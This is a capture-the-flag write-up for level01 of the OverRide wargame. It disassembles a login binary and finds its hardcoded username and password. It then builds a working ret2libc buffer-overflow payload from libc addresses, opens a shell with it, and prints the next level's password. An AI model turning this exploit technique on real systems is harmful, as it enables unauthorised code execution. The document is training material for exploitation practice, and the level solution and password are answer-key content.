# Level01

### Exploit :

Ret2libc

### Step 1 :

```
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: test
verifying username....

nope, incorrect username...

level01@OverRide:~$
```

The program asks for a username and reads our response on stdin.

### Step 2 :

First, let's look at the functions used :

```bash
(gdb) info function
(gdb) info function
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  printf
0x08048360  printf@plt
0x08048370  fgets
0x08048370  fgets@plt
0x08048380  puts
0x08048380  puts@plt
0x08048390  __gmon_start__
0x08048390  __gmon_start__@plt
0x080483a0  __libc_start_main
0x080483a0  __libc_start_main@plt
0x080483b0  _start
0x080483e0  __do_global_dtors_aux
0x08048440  frame_dummy
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main
0x080485c0  __libc_csu_init
0x08048630  __libc_csu_fini
0x08048632  __i686.get_pc_thunk.bx
0x08048640  __do_global_ctors_aux
0x0804866c  _fini
```

We had a main function and 2 other functions (verify_user_name and verify_user_pass). No call to system function.

Let's see main function :

```
(gdb) disas main
(gdb) disas main
Dump of assembler code for function main:
   0x080484d0 <+0>:	push   ebp
   0x080484d1 <+1>:	mov    ebp,esp
   0x080484d3 <+3>:	push   edi
   0x080484d4 <+4>:	push   ebx
   0x080484d5 <+5>:	and    esp,0xfffffff0
   0x080484d8 <+8>:	sub    esp,0x60
   0x080484db <+11>:	lea    ebx,[esp+0x1c]
   0x080484df <+15>:	mov    eax,0x0
   0x080484e4 <+20>:	mov    edx,0x10
   0x080484e9 <+25>:	mov    edi,ebx
   0x080484eb <+27>:	mov    ecx,edx
   0x080484ed <+29>:	rep stos DWORD PTR es:[edi],eax
   0x080484ef <+31>:	mov    DWORD PTR [esp+0x5c],0x0
   0x080484f7 <+39>:	mov    DWORD PTR [esp],0x80486b8
   0x080484fe <+46>:	call   0x8048380 <puts@plt>
   0x08048503 <+51>:	mov    eax,0x80486df
   0x08048508 <+56>:	mov    DWORD PTR [esp],eax
   0x0804850b <+59>:	call   0x8048360 <printf@plt>
   0x08048510 <+64>:	mov    eax,ds:0x804a020
   0x08048515 <+69>:	mov    DWORD PTR [esp+0x8],eax
   0x08048519 <+73>:	mov    DWORD PTR [esp+0x4],0x100
   0x08048521 <+81>:	mov    DWORD PTR [esp],0x804a040
   0x08048528 <+88>:	call   0x8048370 <fgets@plt>
   0x0804852d <+93>:	call   0x8048464 <verify_user_name>
   0x08048532 <+98>:	mov    DWORD PTR [esp+0x5c],eax
   0x08048536 <+102>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x0804853b <+107>:	je     0x8048550 <main+128>
   0x0804853d <+109>:	mov    DWORD PTR [esp],0x80486f0
   0x08048544 <+116>:	call   0x8048380 <puts@plt>
   0x08048549 <+121>:	mov    eax,0x1
   0x0804854e <+126>:	jmp    0x80485af <main+223>
   0x08048550 <+128>:	mov    DWORD PTR [esp],0x804870d
   0x08048557 <+135>:	call   0x8048380 <puts@plt>
   0x0804855c <+140>:	mov    eax,ds:0x804a020
   0x08048561 <+145>:	mov    DWORD PTR [esp+0x8],eax
   0x08048565 <+149>:	mov    DWORD PTR [esp+0x4],0x64
   0x0804856d <+157>:	lea    eax,[esp+0x1c]
   0x08048571 <+161>:	mov    DWORD PTR [esp],eax
   0x08048574 <+164>:	call   0x8048370 <fgets@plt>
   0x08048579 <+169>:	lea    eax,[esp+0x1c]
   0x0804857d <+173>:	mov    DWORD PTR [esp],eax
   0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
   0x08048585 <+181>:	mov    DWORD PTR [esp+0x5c],eax
   0x08048589 <+185>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x0804858e <+190>:	je     0x8048597 <main+199>
   0x08048590 <+192>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x08048595 <+197>:	je     0x80485aa <main+218>
   0x08048597 <+199>:	mov    DWORD PTR [esp],0x804871e
   0x0804859e <+206>:	call   0x8048380 <puts@plt>
   0x080485a3 <+211>:	mov    eax,0x1
   0x080485a8 <+216>:	jmp    0x80485af <main+223>
   0x080485aa <+218>:	mov    eax,0x0
   0x080485af <+223>:	lea    esp,[ebp-0x8]
   0x080485b2 <+226>:	pop    ebx
   0x080485b3 <+227>:	pop    edi
   0x080485b4 <+228>:	pop    ebp
   0x080485b5 <+229>:	ret
End of assembler dump.
```

Main function just read user input, verify input and quit.

Let's look other function :

```
(gdb) disas verify_user_name
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:	push   ebp
   0x08048465 <+1>:	mov    ebp,esp
   0x08048467 <+3>:	push   edi
   0x08048468 <+4>:	push   esi
   0x08048469 <+5>:	sub    esp,0x10
   0x0804846c <+8>:	mov    DWORD PTR [esp],0x8048690									
   0x08048473 <+15>:	call   0x8048380 <puts@plt>
   0x08048478 <+20>:	mov    edx,0x804a040													
   0x0804847d <+25>:	mov    eax,0x80486a8														
   0x08048482 <+30>:	mov    ecx,0x7
   0x08048487 <+35>:	mov    esi,edx
   0x08048489 <+37>:	mov    edi,eax
   0x0804848b <+39>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]	
   0x0804848d <+41>:	seta   dl
   0x08048490 <+44>:	setb   al
   0x08048493 <+47>:	mov    ecx,edx
   0x08048495 <+49>:	sub    cl,al
   0x08048497 <+51>:	mov    eax,ecx
   0x08048499 <+53>:	movsx  eax,al
   0x0804849c <+56>:	add    esp,0x10
   0x0804849f <+59>:	pop    esi
   0x080484a0 <+60>:	pop    edi
   0x080484a1 <+61>:	pop    ebp
   0x080484a2 <+62>:	ret
End of assembler dump.

(gdb) disas verify_user_pass
Dump of assembler code for function verify_user_pass:
   0x080484a3 <+0>:	push   ebp
   0x080484a4 <+1>:	mov    ebp,esp
   0x080484a6 <+3>:	push   edi
   0x080484a7 <+4>:	push   esi
   0x080484a8 <+5>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080484ab <+8>:	mov    edx,eax
   0x080484ad <+10>:	mov    eax,0x80486b0																			
   0x080484b2 <+15>:	mov    ecx,0x5
   0x080484b7 <+20>:	mov    esi,edx
   0x080484b9 <+22>:	mov    edi,eax
   0x080484bb <+24>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]						
   0x080484bd <+26>:	seta   dl
   0x080484c0 <+29>:	setb   al
   0x080484c3 <+32>:	mov    ecx,edx
   0x080484c5 <+34>:	sub    cl,al
   0x080484c7 <+36>:	mov    eax,ecx
   0x080484c9 <+38>:	movsx  eax,al
   0x080484cc <+41>:	pop    esi
   0x080484cd <+42>:	pop    edi
   0x080484ce <+43>:	pop    ebp
   0x080484cf <+44>:	ret
End of assembler dump.
```

- verify_user_name : compares the first 7 characters to "dat_wil"
- Verify_user_pass : compare user input to "admin"

### Step 3 :

For this level, we can exploit the program with ret2libc exploit. For that, I need 4 informations :

- offset

  ```
  (gdb) r
  The program being debugged has been started already.
  Start it from the beginning? (y or n) y
  Starting program: /home/users/level01/level01
  ********* ADMIN LOGIN PROMPT *********
  Enter Username: dat_wil
  verifying username....
  
  Enter Password:
  Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
  nope, incorrect password...
  
  
  Program received signal SIGSEGV, Segmentation fault.
  0x37634136 in ?? ()
  ```

  Offset is 80

- adress of system

  ```
  (gdb) info function system
  All functions matching regular expression "system":
  
  Non-debugging symbols:
  0xf7e6aed0  __libc_system
  0xf7e6aed0  system
  0xf7f48a50  svcerr_systemerr
  ```

  Adress is : 0xf7e6aed0 (\xd0\xae\xe6\xf7 little endian)

- adress of return

  ```
  (gdb) info function exit
  All functions matching regular expression "exit":
  
  Non-debugging symbols:
  0xf7e5eb70  exit
  0xf7e5eba0  on_exit
  0xf7e5edb0  __cxa_atexit
  0xf7e5ef50  quick_exit
  0xf7e5ef80  __cxa_at_quick_exit
  0xf7ee45c4  _exit
  0xf7f27ec0  pthread_exit
  0xf7f2d4f0  __cyg_profile_func_exit
  0xf7f4bc30  svc_exit
  0xf7f55d80  atexit
  ```

  Adress is 0xf7e5eb70 (\x70\xeb\xe5\xf7 little endian)

- adress of string "/bin/sh"

  ```
  (gdb) info proc map
  process 1707
  Mapped address spaces:
  
  	Start Addr   End Addr       Size     Offset objfile
  	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
  	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
  	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
  	0xf7e2b000 0xf7e2c000     0x1000        0x0
  	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
  	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
  	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
  	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
  	0xf7fd0000 0xf7fd4000     0x4000        0x0
  	0xf7fda000 0xf7fdb000     0x1000        0x0
  	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
  	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
  	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
  	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
  	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
  (gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
  0xf7f897ec
  1 pattern found.
  (gdb)
  ```

  Adress is 0xf7f897ec (\xec\x97\xf8\xf7 little endian)

Now I can create my payload 

```
level01@OverRide:~$ (python -c 'print "dat_wil\n" + "A" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' ; cat -) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
level01@OverRide:~$ su level02
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
level02@OverRide:~$
```

Level01 done !